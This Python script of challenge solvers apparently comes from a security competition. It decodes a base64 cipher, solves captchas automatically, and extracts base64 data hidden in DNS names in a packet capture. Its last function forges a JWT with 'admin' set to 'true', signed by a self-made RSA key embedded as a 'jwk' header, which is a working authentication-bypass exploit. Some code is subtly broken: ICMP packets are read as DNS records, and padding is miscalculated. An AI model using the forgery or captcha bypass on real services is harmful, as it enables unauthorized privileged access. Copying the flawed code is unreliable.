import base64
import cv2
import json
import numpy as np
import tempfile
from amazoncaptcha import AmazonCaptcha
import time
import os
from scapy.all import *
from io import BytesIO
import jwt
from jwcrypto import jwk
import re
import datetime

def binary_to_number(binary):
    number = 0
    length = len(binary)
    for i in range(0, length):
        if (binary[i] == '1'):
            number += 2**(length-i-1)
    return number


def base64_padding(s):
    return s + '=' * (4 - len(s) % 4)


def cipher_solver(question):
    start=datetime.datetime.now()
    text = base64_padding(question)
    newtext = base64.b64decode(text)
    newtext = newtext.decode()
    i=1
    rightnumber=0
    k=len(newtext)-2
    while(newtext[k]!=','):
        if newtext[k]=='1':
            rightnumber+=2**(len(newtext)-k-2)
        k-=1
    ans=""
    while newtext[i]!=',':
        num=0
        j=i-1
        end=i+6
        while j < end:
            j+=1
            if newtext[j]=='0':
                continue
            num+=2**(7-(j-i)-1)
        if (num <= 90):
            num -= rightnumber
            if (num < 65):
                num += 26
        else:
            num -= rightnumber
            if (num < 97):
                num += 26
        num = chr(num)
        ans+=num
        i+=7        
    end=datetime.datetime.now()
    print((end-start)*1000)
    return ans


cipher_solver("KDExMDExMDExMDExMDAxMTEwMDEwMDEwMDEwMTAxMDEwMTAxMTEwMTAwMDEwMDEwMTAxMDExMDAxMTAwMDAxMTExMTAxMDEsMTAwMDAp")

def captcha_solver(question):
    # calculate time to solve
    captcha_array = []
    captcha_array = np.array(question, dtype=np.uint8)
    captcha_bgr = cv2.cvtColor(captcha_array, cv2.COLOR_GRAY2BGR)
    temp_file = tempfile.NamedTemporaryFile(
        suffix='.png', mode='w+b', delete=False)
    cv2.imwrite(temp_file.name, captcha_bgr)
    captcha = AmazonCaptcha(temp_file.name)
    solution = captcha.solve()
    temp_file.close()
    os.unlink(temp_file.name)
    return solution


def pcap_solver(question):
    # calc time
    # Return solution
    base64_string = base64_padding(question)
    pcap_bytes = base64.b64decode(base64_string)

    pcap_packets = rdpcap(BytesIO(pcap_bytes))

    dns_packets = [
        packet for packet in pcap_packets if packet.haslayer("ICMP")]

    li = []
    for packet in dns_packets:
        li.append(packet["ICMP"].qd.qname.decode())

    def get_subdomain(domain):
        parts = domain.split('.')
        return parts[0] if len(parts) > 1 else ''

    li.sort(key=get_subdomain)
    editedList = []
    for dns in li:
        splitedText = dns.split(".")
        base = ""
        if (splitedText[0] == "NA"):
            base += splitedText[0]
            base += splitedText[1]
        else:
            base += splitedText[1]
        editedList.append(base)
    solution = base64.b64decode(base64_padding(
        ''.join(editedList))).decode("ISO-8859-1")
    # filteredSolution = re.sub(r'\W+', '', solution)
    filteredSolution = ''.join(c for c in solution if c.isalnum())
    return filteredSolution


def server_solver(question):
    splitedToken = question.split('.')
    headers = splitedToken[0]
    payload = splitedToken[1]

    decoded_bytes = base64.b64decode(base64_padding(headers))
    headers = json.loads(decoded_bytes.decode('utf-8'))

    decoded_bytes = base64.b64decode(base64_padding(payload))
    payload = json.loads(decoded_bytes.decode('utf-8'))

    new_payload = {key: value for key, value in payload.items()}
    new_payload["admin"] = "true"

    private_key = jwk.JWK.generate(kty="RSA", size=2048, kid=headers["kid"])
    public_key = json.loads(private_key.export(False))

    header = {'alg': 'RS256',
              'kid': headers["kid"], 'jwk': public_key, 'typ': 'JWT'}
    jwt_token = jwt.encode(new_payload, private_key.export_to_pem(
        private_key=True, password=None), algorithm="RS256", headers=header)
    return jwt_token
